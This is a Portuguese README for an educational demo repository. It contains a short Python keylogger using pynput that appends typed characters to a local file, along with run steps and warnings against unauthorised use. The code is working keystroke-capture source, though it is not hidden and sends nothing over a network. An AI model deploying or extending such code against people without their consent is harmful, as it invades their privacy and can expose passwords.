# Keypress Logger Demo

Este repositório contém um exemplo **educacional** de um keylogger simples em Python utilizando a biblioteca `pynput`. O objetivo é demonstrar como funciona a captura de eventos do teclado para fins de estudo, testes e auditoria.

⚠️ **AVISO IMPORTANTE**
Este projeto é **exclusivamente para fins educacionais**. O uso desse tipo de software sem autorização explícita é ilegal e pode resultar em penalidades criminais. Utilize apenas em ambientes controlados.

---

## 📁 Estrutura do Projeto

```
keypress-logger-demo/
│
├── src/
│   └── keylogger.py
│
├── keyfile.txt (gerado automaticamente após execução)
│
└── README.md
```

---

## 🧠 Como funciona

O script utiliza `pynput.keyboard.Listener` para monitorar cada tecla pressionada.
Cada tecla capturada é escrita no arquivo `keyfile.txt` no modo append (`a`).

---

## ▶️ Como executar o projeto

### 1. Instale as dependências

```bash
pip install pynput
```

### 2. Execute o script

```bash
python src/keylogger.py
```

### 3. Verifique o arquivo de saída

Após a execução, um arquivo chamado **keyfile.txt** será criado automaticamente contendo as teclas registradas.

---

## 📌 Código Fonte (`src/keylogger.py`)

```python
from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open('keyfile.txt', 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print('Error getting char')

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
```

---

## 🛡️ Uso Ético

Este projeto deve ser usado apenas para:

* Estudo sobre captura de eventos do sistema
* Pesquisas de segurança autorizadas
* Demonstrações em ambientes controlados

❌ Nunca utilize este código sem **consentimento explícito** do usuário do computador.

---

## 📄 Licença

MIT License — Livre para uso educacional e estudos.
